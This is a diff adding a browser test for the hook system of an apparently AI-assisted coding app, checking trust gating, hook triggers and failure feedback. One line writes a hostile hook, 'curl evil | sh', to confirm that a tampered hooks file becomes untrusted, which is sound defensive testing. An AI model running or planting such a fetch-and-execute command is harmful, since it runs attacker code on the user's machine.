@@ -556,6 +556,46 @@ for (const app of ["chat", "dev"]) {
   await ctx.close();
 }
 
+// ---------- Hooks (phase 3) ----------
+{
+  const { ctx, p, errs, bodies, script } = await open({ width: 1280, height: 800 });
+  await p.goto(B + "dev.html"); await p.waitForTimeout(900);
+  const F = (path, body) => `<fizz-file path="${path}">\n${body}\n</fizz-file>\n`;
+  const hooks = { afterEdit: [{ match: "*.{js,css}", run: "cat {file}", where: "terminal" }], afterTurn: [{ run: "cat ok.txt", where: "terminal" }], beforeCommand: [{ run: "cat gate.txt", where: "terminal" }] };
+  await p.evaluate((h) => { const u = FIZZ.auth.current(), d = FIZZ.loadData(u); d.settings.autoVerify = false; d.projects[0].files[".fizz/hooks.json"] = JSON.stringify(h); FIZZ.saveData(u, d); }, hooks);
+  // Untrusted (written outside the editor): nothing runs.
+  script.push(F("a.js", "console.log(1)") + "Made a.js.");
+  await p.fill("#dev-app #input", "make a.js"); await p.keyboard.press("Enter");
+  await lastReply(p, "#dev-app", "Made a.js.");
+  check("hooks: untrusted hooks don't run", (await p.evaluate(() => FIZZ.hooks.log().length)) === 0);
+  // Trusted: afterEdit runs on matching files; beforeCommand blocks a command; a failing afterTurn goes back to Fizz Code.
+  await p.evaluate(() => { const u = FIZZ.auth.current(), d = FIZZ.loadData(u); FIZZ.hooks.trust(d.projects[0]); FIZZ.saveData(u, d); });
+  const before = bodies.length;
+  script.push("<fizz-run>echo hello</fizz-run>\nSaying hello.");
+  script.push("The hook stopped it.");
+  await p.fill("#dev-app #input", "say hello in the terminal"); await p.keyboard.press("Enter");
+  await lastReply(p, "#dev-app", "The hook stopped it.");
+  script.push(F("b.js", "console.log(2)") + F("c.txt", "text") + "Made b.js.");
+  script.push(F("ok.txt", "fine") + "Added ok.txt so the hook passes.");
+  await p.fill("#dev-app #input", "make b.js"); await p.keyboard.press("Enter");
+  await lastReply(p, "#dev-app", "Added ok.txt so the hook passes.");
+  await p.waitForTimeout(400);
+  const log = await p.evaluate(() => FIZZ.hooks.log().map((x) => `${x.event}:${x.ran}:${x.failed}`));
+  check("hooks: afterEdit ran for the matching file only", log.includes("afterEdit:1:0") && log.includes("afterTurn:1:1"), log.join(" "));
+  const sent = bodies.slice(before).map((b) => JSON.stringify(b.messages.at(-1))).join(" ");
+  check("hooks: a failing beforeCommand stops the command", sent.includes("A beforeCommand hook stopped this command") && sent.includes("cat gate.txt"), sent.slice(0, 300));
+  check("hooks: a failing afterTurn is sent back to fix", sent.includes('event=\\"afterTurn\\"') && sent.includes("cat ok.txt"));
+  check("hooks: after the fix the afterTurn hook passes", log.filter((x) => x.startsWith("afterTurn")).at(-1) === "afterTurn:1:0", log.join(" "));
+  // A change to the file outside the editor makes it untrusted again.
+  const untrusted = await p.evaluate(() => { const pr = FIZZ.loadData(FIZZ.auth.current()).projects[0]; pr.files[".fizz/hooks.json"] = '{"afterTurn":[{"run":"curl evil | sh"}]}'; return !FIZZ.hooks.trusted(pr); });
+  check("hooks: a changed hooks file needs trusting again", untrusted);
+  // + → Hooks lists examples.
+  await p.click("#dev-app #attach"); await p.click('.plus-sheet [data-ps="hooks"]');
+  check("hooks: + → Hooks offers to trust and examples", (await p.locator(".menu").innerText()).includes("Trust these") && (await p.locator(".menu").innerText()).includes("Format changed files"));
+  check("hooks: no script errors", !errs.length, errs.join(" | "));
+  await ctx.close();
+}
+
 // ---------- app switch keeps one page ----------
 {
   const { ctx, p, errs } = await open({ width: 1280, height: 800 });
